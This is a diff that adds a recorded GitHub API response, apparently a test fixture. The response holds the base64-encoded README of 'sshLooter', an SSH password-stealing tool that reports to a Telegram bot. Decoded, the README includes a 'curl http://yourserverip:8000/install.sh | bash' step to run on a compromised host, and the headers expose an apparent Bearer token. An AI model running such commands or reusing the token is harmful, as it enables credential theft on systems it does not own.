@@ -1,0 +1,33 @@
+HTTP/1.1 200 OK
+Transfer-Encoding: chunked
+Access-Control-Allow-Origin: *
+Access-Control-Expose-Headers: ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type
+Cache-Control: private, max-age=60, s-maxage=60
+Content-Security-Policy: default-src 'none'
+Content-Type: application/json; charset=utf-8
+Date: Mon, 24 Feb 2020 11:08:50 GMT
+Etag: W/"6dbcc2b9d14cbc7cb260635177d10765"
+Last-Modified: Wed, 19 Dec 2018 20:34:51 GMT
+Referrer-Policy: origin-when-cross-origin, strict-origin-when-cross-origin
+Server: GitHub.com
+Status: 200 OK
+Strict-Transport-Security: max-age=31536000; includeSubdomains; preload
+Vary: Accept, Authorization, Cookie, X-GitHub-OTP
+Vary: Accept-Encoding, Accept, X-Requested-With
+X-Accepted-Oauth-Scopes: 
+X-Content-Type-Options: nosniff
+X-Frame-Options: deny
+X-Github-Media-Type: github.v3; format=json
+X-Github-Request-Id: FFA3:B9CD:5C089:6EED4:5E53AEC2
+X-Oauth-Scopes: gist, notifications, read:discussion, read:enterprise, read:gpg_key, read:org, read:packages, read:public_key, read:repo_hook, read:user, repo
+X-Ratelimit-Limit: 5000
+X-Ratelimit-Remaining: 4273
+X-Ratelimit-Reset: 1582545249
+X-Varied-Accept: application/vnd.github.v3+json
+X-Varied-Authorization: Bearer 2188eea706e4318ebb792c15141e1e6c8d7b5dd4
+X-Xss-Protection: 1; mode=block
+
+849
+{"name":"README.md","path":"README.md","sha":"ba06494647d6b18e0353ceda134458425e7a59ef","size":954,"url":"https://api.github.com/repos/mthbernardes/sshLooter/contents/README.md?ref=master","html_url":"https://github.com/mthbernardes/sshLooter/blob/master/README.md","git_url":"https://api.github.com/repos/mthbernardes/sshLooter/git/blobs/ba06494647d6b18e0353ceda134458425e7a59ef","download_url":"https://raw.githubusercontent.com/mthbernardes/sshLooter/master/README.md","type":"file","content":"IyBET04nVCBVU0UgVEhJUwpUaGVyZSdzIGEgQyB2ZXJzaW9uIHdoaWNoIGlz\nIG11Y2ggYmV0dGVyIFtzc2hMb290ZXJDXShodHRwczovL2dpdGh1Yi5jb20v\nbXRoYmVybmFyZGVzL3NzaExvb3RlckMpCgojIHNzaExvb3RlcgpTY3JpcHQg\ndG8gc3RlYWwgcGFzc3dvcmRzIGZyb20gc3NoLgoKIyBJbnN0YWxsCjxwcmU+\nCmdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vbXRoYmVybmFyZGVzL3Nz\naExvb3Rlci5naXQKY2Qgc3NoTG9vdGVyCjwvcHJlPgoKIyBDb25maWd1cmF0\naW9uCjxwcmU+CkVkaXQgdGhlIHNjcmlwdCBvbiBpbnN0YWxsLnNoLCBhbmQg\nYWRkIHlvdXIgdGVsZWdyYW0gYm90IGFwaSwgYW5kIHlvdXIgdXNlcmlkLgpD\nYWxsIHRoZSBAYm90ZmF0aGVyIG9uIHRlbGVncmFtIHRvIGNyZWF0ZSBhIGJv\ndCBhbmQgY2FsbCB0aGUgQHVzZXJpbmZvYm90IHRvIGdldCB5b3VyIHVzZXIg\naWQuCjwvcHJlPgoKIyBVc2FnZQo8cHJlPgpPbiB5b3VyIHNlcnZlciBleGVj\ndXRlLgpweXRob24gLW0gU2ltcGxlSFRUUFNlcnZlcgoKT24gdGhlIGhhY2tl\nZCBjb21wdXRlciBleGVjdXRlLgpjdXJsIGh0dHA6Ly95b3Vyc2VydmVyaXA6\nODAwMC9pbnN0YWxsLnNoIHwgYmFzaAo8L3ByZT4KCiMgT3JpZ2luYWwgc2Ny\naXB0IGZyb20KPGEgaHJlZj0iaHR0cDovL3d3dy5jaG9rZXBvaW50Lm5ldC8y\nMDE0LzAxL21vcmUtZnVuLXdpdGgtcGFtLXB5dGhvbi1mYWlsZWQuaHRtbCIg\ndGFyZ2V0PSJfYmxhbmsiPkNob2tlUG9pbnQ8L2E+CgojIE15IHBvc3QgYWJv\ndXQgdGhpcyBzY3JpcHQKPGEgaHJlZj0iaHR0cHM6Ly9tdGhiZXJuYXJkZXMu\nZ2l0aHViLmlvL3BlcnNpc3RlbmNlLzIwMTgvMDIvMTAvc3RlYWxpbmctc3No\nLWNyZWRlbnRpYWxzLWFub3RoZXItYXBwcm9hY2guaHRtbCIgdGFyZ2V0PSJf\nYmxhbmsiPlN0ZWFsaW5nIFNTSCBjcmVkZW50aWFscyBBbm90aGVyIEFwcHJv\nYWNoLjwvYT4K\n","encoding":"base64","_links":{"self":"https://api.github.com/repos/mthbernardes/sshLooter/contents/README.md?ref=master","git":"https://api.github.com/repos/mthbernardes/sshLooter/git/blobs/ba06494647d6b18e0353ceda134458425e7a59ef","html":"https://github.com/mthbernardes/sshLooter/blob/master/README.md"}}
+0
+
